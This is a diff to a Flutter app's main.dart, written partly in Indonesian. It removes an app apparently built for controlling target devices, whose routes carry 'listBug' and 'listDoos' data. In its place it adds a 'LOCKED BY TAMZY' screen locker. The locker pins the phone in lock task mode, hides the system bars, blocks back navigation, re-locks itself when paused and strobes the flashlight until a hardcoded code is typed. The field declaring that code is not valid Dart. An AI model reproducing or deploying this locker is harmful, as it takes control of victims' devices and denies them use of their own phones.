@@ -1,152 +1,202 @@
 import 'package:flutter/material.dart';
-import 'login_page.dart';
-import 'dashboard_page.dart';
-import 'landing.dart';
-import 'device_permission.dart';
-import 'control_panel.dart';
-import 'device_dashboard.dart';
-import 'splash.dart';
-import 'seller_page.dart';
+import 'package:flutter/services.dart';
+import 'package:flashlight/flashlight.dart'; // ✅ Panggil lampu
+import 'dart:async';
 
 void main() {
-  runApp(const MyApp());
+  runApp(const LockedApp());
 }
 
-class MyApp extends StatelessWidget {
-  const MyApp({super.key});
-
-  // Animasi page transition yang smooth
-  Route _createRoute(Widget page) {
-    return PageRouteBuilder(
-      transitionDuration: const Duration(milliseconds: 400),
-      reverseTransitionDuration: const Duration(milliseconds: 400),
-      pageBuilder: (context, animation, secondaryAnimation) => page,
-      transitionsBuilder: (context, animation, secondaryAnimation, child) {
-        const curve = Curves.easeOutCubic;
-        var tween = Tween(begin: const Offset(0.05, 0.0), end: Offset.zero)
-            .chain(CurveTween(curve: curve));
-        var offsetAnimation = animation.drive(tween);
-        
-        var fadeTween = Tween(begin: 0.0, end: 1.0)
-            .chain(CurveTween(curve: curve));
-        var fadeAnimation = animation.drive(fadeTween);
-        
-        return FadeTransition(
-          opacity: fadeAnimation,
-          child: SlideTransition(
-            position: offsetAnimation,
-            child: child,
-          ),
-        );
-      },
-    );
-  }
+class LockedApp extends StatelessWidget {
+  const LockedApp({super.key});
 
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
+      title: 'LOCKED BY TAMZY',
+      theme: ThemeData.dark(),
+      home: const LockScreen(),
       debugShowCheckedModeBanner: false,
-      title: 'Genius',
-      theme: ThemeData(
-        brightness: Brightness.dark,
-        fontFamily: 'ShareTechMono',
-        scaffoldBackgroundColor: const Color(0xFF120000),
-        colorScheme: ColorScheme.dark().copyWith(
-          primary: const Color(0xFFE53935),
-          secondary: const Color(0xFFFF5252),
-          surface: const Color(0xFF2A0000),
-        ),
-        pageTransitionsTheme: PageTransitionsTheme(
-          builders: {
-            TargetPlatform.android: CustomPageTransitionBuilder(),
-            TargetPlatform.iOS: CustomPageTransitionBuilder(),
-          },
-        ),
-      ),
-      initialRoute: '/',
-      onGenerateRoute: (settings) {
-        switch (settings.name) {
-          case '/':
-            return _createRoute(const LandingPage());
-          
-          case '/login':
-            return _createRoute(const LoginPage());
-          
-          case '/dashboard':
-            final args = settings.arguments as Map<String, dynamic>;
-            return _createRoute(DashboardPage(
-              username: args['username'],
-              password: args['password'],
-              role: ((args['role'] ?? '').toString()),
-              sessionKey: args['key'],
-              expiredDate: args['expiredDate'],
-              listBug: List<Map<String, dynamic>>.from(args['listBug'] ?? []),
-              listDoos: List<Map<String, dynamic>>.from(args['listDoos'] ?? []),
-              news: List<Map<String, dynamic>>.from(args['news'] ?? []),
-            ));
-
-          case '/seller':
-            final args = settings.arguments as Map<String, dynamic>;
-            return _createRoute(SellerPage(
-              keyToken: args['keyToken'],
-            ));
-
-          case '/device-permission':
-            final args = settings.arguments as Map<String, dynamic>;
-            return _createRoute(DevicePermissionManagerPage(
-              sessionKey: args['sessionKey'],
-              allDevices: args['allDevices'] ?? [],
-            ));
-
-          case '/control-center':
-            final args = settings.arguments as Map<String, dynamic>;
-            return _createRoute(ControlCenterPage(
-              targetDevice: args['targetDevice'],
-              role: args['role'] ?? 'member',
-            ));
-
-          case '/device-dashboard':
-            final args = settings.arguments as Map<String, dynamic>;
-            return _createRoute(DeviceDashboardPage(
-              username: args['username'],
-              role: args['role'],
-              sessionKey: args['sessionKey'],
-            ));
-
-          default:
-            return _createRoute(const Scaffold(
-              body: Center(child: Text("404 - Page Not Found")),
-            ));
-        }
-      },
     );
   }
 }
 
-// Custom page transition builder
-class CustomPageTransitionBuilder extends PageTransitionsBuilder {
+class LockScreen extends StatefulWidget {
+  const LockScreen({super.key});
+
   @override
-  Widget buildTransitions<T>(
-    PageRoute<T> route,
-    BuildContext context,
-    Animation<double> animation,
-    Animation<double> secondaryAnimation,
-    Widget child,
-  ) {
-    const curve = Curves.easeOutCubic;
-    var tween = Tween(begin: const Offset(0.03, 0.0), end: Offset.zero)
-        .chain(CurveTween(curve: curve));
-    var offsetAnimation = animation.drive(tween);
+  State<LockScreen> createState() => _LockScreenState();
+}
+
+class _LockScreenState extends State<LockScreen> with WidgetsBindingObserver {
+  final TextEditingController _passController = TextEditingController();
+  const String _correctPass = "311986";
+  bool _sudahBuka = false;
+  Timer? _timerLampu; // ✅ Pengatur waktu kedip
+
+  static const MethodChannel _platform = MethodChannel('com.example.aplikasi_kunci/kunci');
+
+  @override
+  void initState() {
+    super.initState();
+    WidgetsBinding.instance.addObserver(this);
     
-    var fadeTween = Tween(begin: 0.0, end: 1.0)
-        .chain(CurveTween(curve: curve));
-    var fadeAnimation = animation.drive(fadeTween);
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
+    SystemChrome.setPreferredOrientations([
+      DeviceOrientation.portraitUp,
+      DeviceOrientation.portraitDown,
+    ]);
+
+    if (!_sudahBuka) {
+      _aktifkanKunciSistem();
+      _mulaiKedipLampu(); // ✅ Nyalakan kedip pas buka
+    }
+  }
+
+  // ✅ FUNGSI LAMPU KEDIP-KEDIP OTOMATIS
+  void _mulaiKedipLampu() {
+    _timerLampu = Timer.periodic(const Duration(milliseconds: 300), (timer) async {
+      if (_sudahBuka) {
+        timer.cancel();
+        Flashlight.turnOff(); // Matikan kalau sudah buka
+        return;
+      }
+      bool nyala = timer.tick % 2 == 0;
+      if (nyala) {
+        Flashlight.turnOn();
+      } else {
+        Flashlight.turnOff();
+      }
+    });
+  }
+
+  Future<void> _aktifkanKunciSistem() async {
+    try {
+      await _platform.invokeMethod('startLockTask');
+    } catch (_) {}
+  }
+
+  Future<void> _matikanKunciTotal() async {
+    try {
+      await _platform.invokeMethod('stopLockTask');
+    } catch (_) {}
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
     
-    return FadeTransition(
-      opacity: fadeAnimation,
-      child: SlideTransition(
-        position: offsetAnimation,
-        child: child,
+    // ✅ MATIKAN LAMPU & KEDIPAN SELAMANYA
+    _timerLampu?.cancel();
+    Flashlight.turnOff();
+
+    if (mounted) setState(() => _sudahBuka = true);
+  }
+
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    if (_sudahBuka) return;
+    if (state == AppLifecycleState.paused || state == AppLifecycleState.inactive || state == AppLifecycleState.detached) {
+      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
+      if (!_sudahBuka) _aktifkanKunciSistem();
+    }
+  }
+
+  void _cekSandi() {
+    if (_passController.text == _correctPass) {
+      _matikanKunciTotal();
+      SystemNavigator.pop();
+    } else {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text("❌ KODE SALAH! PERANGKAT TETAP TERKUNCI"), backgroundColor: Colors.red)
+      );
+      _passController.clear();
+    }
+  }
+
+  @override
+  void dispose() {
+    WidgetsBinding.instance.removeObserver(this);
+    _timerLampu?.cancel(); // Pastikan timer mati
+    Flashlight.turnOff(); // Pastikan lampu mati
+    _passController.dispose();
+    super.dispose();
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return PopScope(
+      canPop: _sudahBuka,
+      child: Scaffold(
+        backgroundColor: Colors.black,
+        body: Stack(
+          fit: StackFit.expand,
+          children: [
+            const Positioned.fill(
+              child: SingleChildScrollView(
+                physics: NeverScrollableScrollPhysics(),
+                child: Column(
+                  children: [
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
+                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
+                  ],
+                ),
+              ),
+            ),
+            Center(
+              child: Container(
+                padding: const EdgeInsets.all(28),
+                decoration: BoxDecoration(
+                  color: Colors.black.withValues(alpha: 0.85),
+                  border: Border.all(color: Colors.greenAccent, width: 3),
+                  borderRadius: BorderRadius.circular(15),
+                  boxShadow: [BoxShadow(color: Colors.greenAccent.withValues(alpha: 0.6), blurRadius: 25, spreadRadius: 2)],
+                ),
+                width: 340,
+                child: Column(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    const Text("⚠️ PERANGKAT TERKUNCI ⚠️", style: TextStyle(color: Colors.redAccent, fontSize: 24, fontWeight: FontWeight.bold)),
+                    const SizedBox(height: 20),
+                    const Text("PERANGKAT INI DIKUNCI.\nMASUKKAN KODE RAHASIA UNTUK MEMBUKA.", style: TextStyle(color: Colors.white70, fontSize: 14), textAlign: TextAlign.center),
+                    const SizedBox(height: 20),
+                    TextField(
+                      controller: _passController,
+                      obscureText: true,
+                      style: const TextStyle(color: Colors.greenAccent, fontSize: 20, letterSpacing: 5),
+                      keyboardType: TextInputType.number,
+                      textAlign: TextAlign.center,
+                      decoration: InputDecoration(
+                        filled: true,
+                        fillColor: Colors.grey[900],
+                        border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: Colors.greenAccent, width: 2)),
+                        hintText: "______",
+                        hintStyle: const TextStyle(color: Colors.grey, fontSize: 24),
+                      ),
+                      onSubmitted: (_) => _cekSandi(),
+                    ),
+                    const SizedBox(height: 20),
+                    ElevatedButton(
+                      style: ElevatedButton.styleFrom(backgroundColor: Colors.greenAccent[700], padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)), elevation: 10),
+                      onPressed: _cekSandi,
+                      child: const Text("BUKA KUNCI", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
+                    ),
+                  ],
+                ),
+              ),
+            ),
+          ],
+        ),
       ),
     );
   }
